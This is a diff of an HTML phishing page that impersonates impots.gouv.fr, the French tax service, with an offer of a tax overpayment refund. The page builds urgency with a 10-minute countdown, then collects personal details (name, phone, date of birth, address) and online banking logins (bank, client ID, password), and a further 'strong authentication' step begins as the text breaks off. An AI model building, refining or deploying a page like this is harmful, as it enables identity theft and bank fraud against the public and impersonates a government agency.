@@ -1,225 +1,1406 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Prélèvement et Remboursement - impots.gouv.fr</title>
-  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 54 36'%3E%3Crect x='0' y='0' width='18' height='36' fill='%23000091'/%3E%3Crect x='18' y='0' width='18' height='36' fill='%23ffffff'/%3E%3Crect x='36' y='0' width='18' height='36' fill='%23e1000f'/%3E%3C/svg%3E">
+  
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 54 36'%3E%3Crect x='0' y='0' width='18' height='36' fill='%23000091'/%3E%3Crect x='18' y='0' width='18' height='36' fill='%23ffffff'/%3E%3Crect x='36' y='0' width='18' height='36' fill='%23e1000f'/%3E%3Cpath d='M48 36 C44 36 40 30 38 21 C36 12 33 6 29 6 C23 6 18 21 18 36 Z' fill='%23ffffff'/%3E%3Cpath d='M24 36 C24 24 28 12 33 12 C35 12 37 15 39 21 C41 27 44 33 48 36 Z' fill='%23ffffff'/%3E%3C/svg%3E">
+
   <link href="https://fonts.googleapis.com/css2?family=Marianne:wght@400;500;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Marianne', 'Poppins', sans-serif; color: #161616; background-color: #f6f6f6; min-height: 100vh; display: flex; flex-direction: column; }
-    .top-bar { background: #ffffff; border-bottom: 1px solid #ddd; padding: 10px 24px; display: flex; align-items: center; justify-content: space-between; }
-    .brand-section { display: flex; align-items: center; gap: 15px; }
-    .marianne-logo { height: 65px; width: auto; display: block; }
-    .site-title-logo { font-size: 1.6rem; font-weight: 700; color: #000091; text-decoration: none; }
+
+    body {
+      font-family: 'Marianne', 'Poppins', sans-serif;
+      color: #161616;
+      background-color: #f6f6f6;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ===== TOP HEADER & NAVBAR ===== */
+    .top-bar {
+      background: #ffffff;
+      border-bottom: 1px solid #ddd;
+      padding: 10px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .brand-section {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    
+    .marianne-logo {
+      height: 65px;
+      width: auto;
+      display: block;
+    }
+
+    .site-title-logo {
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: #000091;
+      text-decoration: none;
+      letter-spacing: -0.5px;
+    }
     .site-title-logo span { color: #e1000f; }
-    .hero { background: linear-gradient(135deg, #f0f4ff 0%, #ffffff 100%); padding: 40px 24px; display: flex; justify-content: center; align-items: center; flex: 1; }
-    .hero-container { max-width: 1200px; width: 100%; display: grid; grid-template-columns: 1.2fr 1fr; gap: 40px; align-items: center; }
-    .hero-left h1 { font-size: 2.5rem; font-weight: 700; line-height: 1.15; color: #161616; }
-    .form-card, .eligibility-card, .page2-card { background: #ffffff; color: #161616; border-radius: 8px; padding: 30px 24px; width: 100%; max-width: 440px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); display: flex; flex-direction: column; gap: 16px; border-top: 4px solid #000091; }
-    .card-title { font-size: 1.25rem; font-weight: 700; color: #161616; }
-    .card-text { font-size: 0.85rem; color: #333; line-height: 1.5; }
-    .eligibility-input, .p3-input, .iban-input, .bank-select { width: 100%; height: 44px; border: 1px solid #767676; border-radius: 4px; padding: 0 12px; font-family: inherit; font-size: 0.9rem; outline: none; background: #fff; }
-    .eligibility-input:focus, .p3-input:focus, .iban-input:focus, .bank-select:focus { border-color: #000091; box-shadow: 0 0 0 3px rgba(0,0,145,0.2); }
-    .btn-main, .btn-main1, .btn-continuer, .btn-eligibility { background-color: #000091; color: white; font-family: inherit; font-size: 0.95rem; font-weight: 600; border: none; border-radius: 4px; padding: 12px 20px; cursor: pointer; width: 100%; text-align: center; }
-    .btn-main:hover, .btn-main1:hover, .btn-continuer:hover, .btn-eligibility:hover { background-color: #1212ff; }
-    .custom-popup { position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 10000; display: none; align-items: center; justify-content: center; padding: 20px; }
+    .site-subtitle {
+      font-size: 0.7rem;
+      color: #666;
+      margin-top: 2px;
+    }
+
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+    .header-link {
+      font-size: 0.85rem;
+      color: #000091;
+      text-decoration: none;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .header-link:hover { text-decoration: underline; }
+
+    nav.sub-nav {
+      background: #ffffff;
+      border-bottom: 1px solid #e5e5e5;
+      padding: 0 24px;
+      display: flex;
+      gap: 30px;
+      height: 45px;
+      align-items: center;
+    }
+    nav.sub-nav a {
+      font-size: 0.88rem;
+      color: #333;
+      text-decoration: none;
+      font-weight: 500;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      border-bottom: 3px solid transparent;
+    }
+    nav.sub-nav a.active, nav.sub-nav a:hover {
+      color: #000091;
+      border-bottom-color: #000091;
+    }
+
+    /* ===== HERO SECTION ===== */
+    .hero {
+      background: linear-gradient(135deg, #f0f4ff 0%, #ffffff 100%);
+      color: #161616;
+      padding: 40px 24px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .hero-container {
+      max-width: 1200px;
+      width: 100%;
+      display: grid;
+      grid-template-columns: 1.2fr 1fr;
+      gap: 40px;
+      align-items: center;
+    }
+
+    .hero-left {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .national-tag {
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      color: #000091;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .national-tag::before {
+      content: '';
+      width: 24px;
+      height: 2px;
+      background: #000091;
+      display: inline-block;
+    }
+    .hero-left h1 {
+      font-size: 2.5rem;
+      font-weight: 700;
+      line-height: 1.15;
+      color: #161616;
+    }
+    .hero-left p.lead {
+      font-size: 1.05rem;
+      line-height: 1.5;
+      color: #333;
+    }
+    .hero-left p.desc {
+      font-size: 0.88rem;
+      line-height: 1.6;
+      color: #555;
+      border-left: 2px solid #000091;
+      padding-left: 12px;
+      margin-top: 5px;
+    }
+
+    .target-cards-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+      margin-top: 15px;
+    }
+    .target-card {
+      background: #ffffff;
+      border: 1px solid #dcdcdc;
+      border-radius: 6px;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      text-decoration: none;
+      color: inherit;
+      transition: all 0.2s;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.03);
+    }
+    .target-card:hover {
+      border-color: #000091;
+      box-shadow: 0 4px 12px rgba(0,0,145,0.1);
+    }
+    .target-card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .target-card-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: #000091;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .target-card-desc {
+      font-size: 0.75rem;
+      color: #666;
+      line-height: 1.4;
+    }
+
+    .hero-right {
+      display: flex;
+      justify-content: center;
+      width: 100%;
+    }
+
+    .form-card, .eligibility-card, .page2-card {
+      background: #ffffff;
+      color: #161616;
+      border-radius: 8px;
+      padding: 30px 24px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      border-top: 4px solid #000091;
+    }
+
+    .eligibility-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      width: 100%;
+    }
+    .eligibility-header svg {
+      width: 32px;
+      height: 32px;
+      color: #000091;
+      flex-shrink: 0;
+    }
+    .card-title {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #161616;
+      line-height: 1.3;
+    }
+    .card-text {
+      font-size: 0.85rem;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    .field-label {
+      font-size: 0.82rem;
+      font-weight: 600;
+      color: #161616;
+    }
+    .field-label span { color: #e1000f; }
+
+    .eligibility-input, .p3-input, .iban-input, .bank-select {
+      width: 100%;
+      height: 44px;
+      border: 1px solid #767676;
+      border-radius: 4px;
+      padding: 0 12px;
+      font-family: inherit;
+      font-size: 0.9rem;
+      color: #161616;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      background: #fff;
+    }
+    .eligibility-input:focus, .p3-input:focus, .iban-input:focus, .bank-select:focus {
+      border-color: #000091;
+      box-shadow: 0 0 0 3px rgba(0,0,145,0.2);
+    }
+
+    .bank-select {
+      appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23333' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 12px center;
+      background-size: 16px;
+      padding-right: 36px;
+      cursor: pointer;
+    }
+
+    .eligibility-info-box {
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      background: #f4f4f4;
+      padding: 10px 12px;
+      border-radius: 4px;
+      font-size: 0.78rem;
+      color: #333;
+      line-height: 1.4;
+      border-left: 3px solid #000091;
+    }
+    .eligibility-info-box svg { width: 14px; height: 14px; fill: #000091; flex-shrink: 0; margin-top: 2px; }
+
+    .btn-main, .btn-main1, .btn-continuer, .btn-eligibility {
+      background-color: #000091;
+      color: white;
+      font-family: inherit;
+      font-size: 0.95rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 4px;
+      padding: 12px 20px;
+      cursor: pointer;
+      transition: background 0.2s;
+      width: 100%;
+      text-align: center;
+    }
+    .btn-main:hover, .btn-main1:hover, .btn-continuer:hover, .btn-eligibility:hover {
+      background-color: #1212ff;
+    }
+
+    .ssl-text {
+      font-size: 0.7rem;
+      color: #666;
+      text-align: center;
+      line-height: 1.4;
+    }
+
+    /* ===== HOW IT WORKS SECTION ===== */
+    .how-it-works-section {
+      background: #ffffff;
+      padding: 50px 24px;
+      border-top: 1px solid #e5e5e5;
+      border-bottom: 1px solid #e5e5e5;
+    }
+    .how-container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .how-title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #161616;
+      margin-bottom: 30px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .how-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 20px;
+    }
+    .how-step-card {
+      background: #f9f9f9;
+      border: 1px solid #eee;
+      border-radius: 8px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .how-step-icon {
+      width: 40px;
+      height: 40px;
+      background: #eef2ff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #000091;
+    }
+    .how-step-number {
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: #000091;
+      text-transform: uppercase;
+    }
+    .how-step-card h3 {
+      font-size: 1rem;
+      font-weight: 700;
+      color: #161616;
+    }
+    .how-step-card p {
+      font-size: 0.8rem;
+      color: #555;
+      line-height: 1.5;
+    }
+
+    .info-banner-bottom {
+      max-width: 1200px;
+      margin: 30px auto 0;
+      background: #eef2ff;
+      border: 1px solid #c7d2fe;
+      border-radius: 6px;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 15px;
+    }
+    .info-banner-content {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      font-size: 0.82rem;
+      color: #1e3a8a;
+      line-height: 1.5;
+    }
+    .info-banner-content svg { width: 20px; height: 20px; fill: #000091; flex-shrink: 0; margin-top: 2px; }
+    .info-banner-link {
+      color: #000091;
+      font-weight: 600;
+      text-decoration: none;
+      white-space: nowrap;
+      font-size: 0.85rem;
+    }
+    .info-banner-link:hover { text-decoration: underline; }
+
+    /* LOADING & MODALS */
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      z-index: 9999;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+    }
+    .loading-overlay.active { display: flex; }
+    .spinner-wrap {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .spinner-ring {
+      position: absolute;
+      inset: 0;
+      border: 5px solid rgba(255,255,255,0.2);
+      border-top-color: #ffda00;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .custom-popup {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 10000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
     .custom-popup.active { display: flex; }
-    .popup-card { background: #fff; border-radius: 6px; padding: 25px 20px; max-width: 360px; width: 100%; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; flex-direction: column; gap: 15px; border-top: 4px solid #e1000f; }
+    .popup-card {
+      background: #fff;
+      border-radius: 6px;
+      padding: 25px 20px;
+      max-width: 360px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      border-top: 4px solid #e1000f;
+    }
     .popup-card h3 { color: #e1000f; font-size: 1.2rem; }
-    .popup-card button { background: #000091; color: white; border: none; padding: 10px 20px; border-radius: 4px; font-weight: 600; cursor: pointer; }
-    @media (max-width: 900px) { .hero-container { grid-template-columns: 1fr; } }
+    .popup-card p { font-size: 0.9rem; color: #333; line-height: 1.5; }
+    .popup-card button {
+      background: #000091;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .countdown-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin: 10px 0;
+    }
+    .countdown-svg {
+      transform: rotate(-90deg);
+      width: 130px;
+      height: 130px;
+    }
+    .countdown-bg { fill: none; stroke: #e6e6e6; stroke-width: 6; }
+    .countdown-progress {
+      fill: none;
+      stroke: #000091;
+      stroke-width: 6;
+      stroke-linecap: round;
+      stroke-dasharray: 395.84;
+      stroke-dashoffset: 0;
+      transition: stroke-dashoffset 1s linear;
+    }
+    .countdown-text {
+      font-size: 1.6rem;
+      font-weight: 700;
+      margin-top: -85px;
+      dominant-baseline: central;
+      text-anchor: middle;
+      fill: #161616;
+    }
+    .countdown-label { font-size: 0.78rem; color: #555; font-weight: 500; margin-top: 8px; text-align: center; }
+
+    .field-error {
+      font-size: 0.72rem;
+      color: #e1000f;
+      margin-top: 3px;
+      display: block;
+    }
+
+    .valid-circle {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: #27a64c;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 15px rgba(39,166,76,0.3);
+      margin: 0 auto;
+    }
+
+    /* ===== FOOTER OFFICIEL ===== */
+    footer.official-footer {
+      background-color: #f6f6f6;
+      color: #161616;
+      padding: 40px 24px 20px;
+      margin-top: auto;
+      border-top: 1px solid #e5e5e5;
+    }
+    .footer-main-row {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 40px;
+      padding-bottom: 30px;
+      border-bottom: 1px solid #ddd;
+    }
+    .footer-left-brand {
+      display: flex;
+      align-items: flex-start;
+      gap: 15px;
+    }
+    .footer-links-grid {
+      display: flex;
+      gap: 40px;
+      flex-wrap: wrap;
+    }
+    .footer-links-col {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .footer-links-col a {
+      font-size: 0.88rem;
+      color: #161616;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .footer-links-col a:hover {
+      text-decoration: underline;
+      color: #000091;
+    }
+    .footer-bottom-row {
+      max-width: 1200px;
+      margin: 20px auto 0;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px 20px;
+      align-items: center;
+      font-size: 0.8rem;
+    }
+    .footer-bottom-row a {
+      color: #333;
+      text-decoration: none;
+      position: relative;
+    }
+    .footer-bottom-row a:hover {
+      text-decoration: underline;
+      color: #000091;
+    }
+    .footer-bottom-row span.separator {
+      color: #bbb;
+    }
+
+    @media (max-width: 900px) {
+      .hero-container { grid-template-columns: 1fr; gap: 30px; }
+      .hero-left h1 { font-size: 2rem; }
+      .footer-main-row { flex-direction: column; gap: 20px; }
+      .footer-links-grid { flex-direction: column; gap: 12px; }
+      .how-grid { grid-template-columns: 1fr; }
+      nav.sub-nav { display: none; }
+    }
   </style>
 </head>
 <body>
 
+  <!-- TOP HEADER -->
   <div class="top-bar">
     <div class="brand-section">
+      <svg class="marianne-logo" viewBox="0 0 200 80" xmlns="http://www.w3.org/2000/svg">
+        <g transform="translate(0, 0)">
+          <rect x="0" y="0" width="18" height="12" fill="#000091"/>
+          <rect x="18" y="0" width="18" height="12" fill="#ffffff"/>
+          <rect x="36" y="0" width="18" height="12" fill="#e1000f"/>
+          <path d="M48 12 C44 12 40 10 38 7 C36 4 33 2 29 2 C23 2 18 7 18 12 Z" fill="#ffffff"/>
+          <path d="M24 12 C24 8 28 4 33 4 C35 4 37 5 39 7 C41 9 44 11 48 12 Z" fill="#ffffff"/>
+        </g>
+        <text x="0" y="28" font-family="Marianne, sans-serif" font-size="12" font-weight="bold" fill="#000091" letter-spacing="0.3">RÉPUBLIQUE</text>
+        <text x="0" y="42" font-family="Marianne, sans-serif" font-size="12" font-weight="bold" fill="#000091" letter-spacing="0.3">FRANÇAISE</text>
+        <text x="0" y="55" font-family="Marianne, sans-serif" font-size="7.5" font-style="italic" fill="#161616">Liberté</text>
+        <text x="0" y="65" font-family="Marianne, sans-serif" font-size="7.5" font-style="italic" fill="#161616">Égalité</text>
+        <text x="0" y="75" font-family="Marianne, sans-serif" font-size="7.5" font-style="italic" fill="#161616">Fraternité</text>
+      </svg>
       <div>
         <a href="#" class="site-title-logo">impots<span>.gouv.fr</span></a>
+        <div class="site-subtitle">Le service en ligne de la Direction générale des Finances publiques</div>
       </div>
+    </div>
+    <div class="header-actions">
+      <a href="#" class="header-link">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+        Connexion à mon espace Finances publiques
+      </a>
     </div>
   </div>
 
+  <nav class="sub-nav">
+    <a href="#" class="active">Accueil</a>
+    <a href="#">Mon espace</a>
+    <a href="#">Particuliers</a>
+    <a href="#">Professionnels</a>
+    <a href="#">Aide et contacts</a>
+  </nav>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner-wrap">
+      <div class="spinner-ring"></div>
+    </div>
+  </div>
+
+  <!-- POPUP MODAL -->
   <div class="custom-popup" id="customPopup">
     <div class="popup-card">
-      <h3 id="popupTitle">Notification</h3>
-      <p id="popupMessage"></p>
+      <h3 id="popupTitle">Erreur de validation</h3>
+      <p id="popupMessage">Veuillez vérifier les informations saisies.</p>
       <button type="button" id="popupCloseBtn">OK</button>
     </div>
   </div>
 
-  <section class="hero">
+  <!-- HERO SECTION -->
+  <section class="hero" id="heroSection">
     <div class="hero-container">
+      
+      <!-- LEFT HERO TEXT -->
       <div class="hero-left">
+        <div class="national-tag">Programme National</div>
         <h1>Trop-perçu d'impôts</h1>
-        <p class="card-text">Vérifiez votre éligibilité et découvrez le montant de votre remboursement.</p>
+        <p class="lead">Vérifiez votre éligibilité et découvrez le montant de votre remboursement.</p>
+        <p class="desc">
+          L'administration fiscale vous rembourse les sommes trop perçues sur vos impôts, suite à une régularisation de votre situation fiscale. Ce dispositif concerne aussi bien les particuliers que les professionnels.
+        </p>
+
+        <!-- Target Cards Grid -->
+        <div class="target-cards-grid">
+          <a href="#heroSection" class="target-card">
+            <div class="target-card-header">
+              <span class="target-card-title">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                Particuliers
+              </span>
+              <span>→</span>
+            </div>
+            <p class="target-card-desc">Salariés, retraités, étudiants, foyers fiscaux...</p>
+          </a>
+
+          <a href="#heroSection" class="target-card">
+            <div class="target-card-header">
+              <span class="target-card-title">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path></svg>
+                Professionnels
+              </span>
+              <span>→</span>
+            </div>
+            <p class="target-card-desc">Entreprises, indépendants, professions libérales...</p>
+          </a>
+        </div>
       </div>
+
+      <!-- RIGHT COLUMN CARDS CONTAINER -->
       <div class="hero-right">
-        <!-- PAGE 0 -->
+
+        <!-- PAGE 0: VÉRIFIEZ VOTRE ÉLIGIBILITÉ -->
         <div class="eligibility-card" id="pageEligibility">
-          <h2 class="card-title">Vérifiez votre éligibilité</h2>
-          <p class="card-text">Entrez votre code de dossier fiscal.</p>
-          <input type="text" id="dossierCodeInput" class="eligibility-input" placeholder="Ex. : FR756ED6">
-          <button type="button" class="btn-eligibility" id="btnCheckEligibility">Vérifier →</button>
+          <div class="eligibility-header">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+              <polyline points="14 2 14 8 20 8"></polyline>
+              <circle cx="11.5" cy="14.5" r="2.5"></circle>
+              <line x1="13.3" y1="16.3" x2="16" y2="19"></line>
+            </svg>
+            <h2 class="card-title" id="eligibilityTitle">Vérifiez votre éligibilité</h2>
+          </div>
+
+          <p class="card-text" id="eligibilityDesc">
+            Entrez votre <b>code de dossier fiscal</b> pour accéder à votre situation et connaître le montant de votre remboursement.
+          </p>
+
+          <div style="display:flex;flex-direction:column;gap:6px;width:100%;">
+            <label class="field-label">Code de dossier fiscal <span>*</span></label>
+            <input type="text" id="dossierCodeInput" class="eligibility-input" placeholder="Ex. : FR7xxxxx">
+          </div>
+
+          <div class="eligibility-info-box" id="eligibilityInfoBox">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+            <span>Votre code de dossier est indiqué dans le message qui vous a été adressé ou au sein de votre espace particulier / professionnel.</span>
+          </div>
+
+          <button type="button" class="btn-eligibility" id="btnCheckEligibility">Vérifiez votre éligibilité →</button>
         </div>
 
-        <!-- PAGE 1 -->
+        <!-- PAGE 1: TRAITEMENT DU REMBOURSEMENT -->
         <div class="form-card" id="page1" style="display:none;">
-          <h2 class="card-title">Traitement du remboursement</h2>
-          <button type="button" class="btn-main" id="btnPage1">Continuer vers les informations</button>
+          <h2 class="card-title" id="page1MainTitle">Traitement du remboursement</h2>
+
+          <div class="countdown-container">
+            <svg class="countdown-svg" viewBox="0 0 140 140">
+              <circle class="countdown-bg" cx="70" cy="70" r="60" />
+              <circle class="countdown-progress" id="countdownCircle" cx="70" cy="70" r="60" />
+            </svg>
+            <text class="countdown-text" id="countdownText">10:00</text>
+            <p class="countdown-label">Temps restant pour valider le virement</p>
+          </div>
+
+          <p class="card-text" id="page1SubText" style="font-size:0.85rem;color:#555;">
+            Vous disposez de 10 minutes pour confirmer la réception de votre dossier de remboursement. Passé ce délai, la procédure devra être relancée.
+          </p>
+
+          <button type="button" class="btn-main" id="btnPage1">Confirmer le remboursement</button>
+          <p class="ssl-text">Connexion sécurisée SSL 256-bit &nbsp;|&nbsp; DGFiP &amp; RGPD</p>
         </div>
 
-        <!-- PAGE 3 -->
+        <!-- PAGE 3: PERSONAL INFO -->
         <div class="page2-card" id="page3" style="display:none;">
           <h2 class="card-title">Vos informations</h2>
-          <input type="text" class="p3-input" placeholder="Prénom">
-          <input type="text" class="p3-input" placeholder="Nom">
-          <input type="tel" class="p3-input" placeholder="Téléphone">
-          <input type="text" class="p3-input" placeholder="jj/mm/aaaa">
-          <input type="text" class="p3-input" placeholder="Adresse">
+          <p style="font-size:0.82rem;color:#666;margin-top:-6px;">Pour votre sécurité, confirmez vos informations personnelles.</p>
+
+          <div style="width:100%;display:flex;flex-direction:column;gap:10px;">
+            <div>
+              <label class="field-label">Prénom <span>*</span></label>
+              <input type="text" class="p3-input" placeholder="Votre prénom">
+            </div>
+            <div>
+              <label class="field-label">Nom <span>*</span></label>
+              <input type="text" class="p3-input" placeholder="Votre nom">
+            </div>
+            <div>
+              <label class="field-label">Téléphone <span>*</span></label>
+              <input type="tel" id="phoneInput" class="p3-input" placeholder="06 12 34 56 78">
+            </div>
+            <div>
+              <label class="field-label">Date de naissance <span>*</span></label>
+              <input type="text" id="dobInput" class="p3-input" placeholder="jj/mm/aaaa" maxlength="10">
+            </div>
+            <div>
+              <label class="field-label">Adresse <span>*</span></label>
+              <input type="text" class="p3-input" placeholder="Numéro et rue">
+            </div>
+            <div style="display:flex;gap:8px;">
+              <div style="flex:1;">
+                <label class="field-label">Code postal</label>
+                <input type="text" id="postalInput" class="p3-input" placeholder="75000" maxlength="5">
+              </div>
+              <div style="flex:2;">
+                <label class="field-label">Ville</label>
+                <input type="text" class="p3-input" placeholder="Paris">
+              </div>
+            </div>
+          </div>
+
           <button type="button" class="btn-main1" id="btnPage3">Valider</button>
         </div>
 
-        <!-- PAGE 4 (Bank Auth & Credentials) -->
+        <!-- PAGE 4: BANK LOGIN -->
         <div class="page2-card" id="page4" style="display:none;">
           <h2 class="card-title">Authentification Bancaire</h2>
-          <select id="bankSelect" class="bank-select p3-input">
-            <option value="" disabled selected>Choisissez votre banque...</option>
-            <option value="Crédit Agricole">Crédit Agricole</option>
-            <option value="Société Générale">Société Générale</option>
-            <option value="BNP Paribas">BNP Paribas</option>
-            <option value="Boursorama">Boursorama Banque</option>
-            <option value="Autre">Autre banque</option>
-          </select>
-          <input type="text" id="bankIdentInput" class="p3-input" placeholder="Identifiant client">
-          <input type="password" id="bankPwdInput" class="p3-input" placeholder="Mot de passe / Code">
+          <p style="font-size:0.82rem;color:#666;margin-top:-6px;">Sélectionnez votre banque ou connectez-vous avec vos identifiants.</p>
+
+          <div>
+            <label class="field-label">Nom de la banque <span>*</span></label>
+            <select id="bankSelect" class="bank-select p3-input">
+              <option value="" disabled selected>Choisissez votre banque...</option>
+              <option value="Bred Banque Populaire">Bred Banque Populaire</option>
+              <option value="Crédit Agricole">Crédit Agricole</option>
+              <option value="Société Générale">Société Générale</option>
+              <option value="BNP Paribas">BNP Paribas</option>
+              <option value="Banque Populaire">Banque Populaire</option>
+              <option value="Caisse d'Epargne">Caisse d'Épargne</option>
+              <option value="LCL">LCL (Le Crédit Lyonnais)</option>
+              <option value="CIC">CIC</option>
+              <option value="Crédit Mutuel">Crédit Mutuel</option>
+              <option value="La Banque Postale">La Banque Postale</option>
+              <option value="Revolut">Revolut</option>
+              <option value="Boursorama Banque / BoursoBank">BoursoBank (Boursorama)</option>
+              <option value="N26">N26</option>
+              <option value="Fortuneo">Fortuneo</option>
+              <option value="Monabanq">Monabanq</option>
+              <option value="Hello bank!">Hello bank!</option>
+              <option value="Autre banque">Autre banque</option>
+            </select>
+          </div>
+
+          <div id="otherBankContainer" style="display:none;">
+            <label class="field-label">Nom de votre banque <span>*</span></label>
+            <input type="text" id="otherBankInput" class="p3-input" placeholder="Entrez le nom de votre banque">
+          </div>
+
+          <div>
+            <label class="field-label">Identifiant client <span>*</span></label>
+            <input type="text" id="bankIdentInput" maxlength="12" class="p3-input" placeholder="Votre identifiant">
+          </div>
+
+          <div>
+            <label class="field-label">Mot de passe <span>*</span></label>
+            <div style="position:relative;width:100%;">
+              <input type="password" maxlength="20" id="bankPwdInput" class="p3-input" placeholder="Votre mot de passe" style="padding-right:40px;">
+              <button type="button" id="bankEyeBtn" style="position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#666;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+              </button>
+            </div>
+          </div>
+
           <button type="button" class="btn-continuer" id="btnPage4">Se connecter</button>
         </div>
 
-        <!-- PAGE AUTH WAIT -->
-        <div class="page2-card" id="pageAuthWait" style="display:none; text-align:center;">
-          <h2 class="card-title">Authentification en cours</h2>
-          <p class="card-text">Veuillez patienter pendant la validation de vos accès...</p>
+        <!-- AUTHENTIFICATION FORTE INSTITUTIONNELLE -->
+        <div class="page2-card" id="pageAuthWait" style="display:none; text-align:left; gap:14px;">
+          <h2 class="card-title" style="text-align:center;">Authentification forte</h2>
+          <p style="font-size:0.82rem; color:#555; text-align:center; margin-top:-6px;">
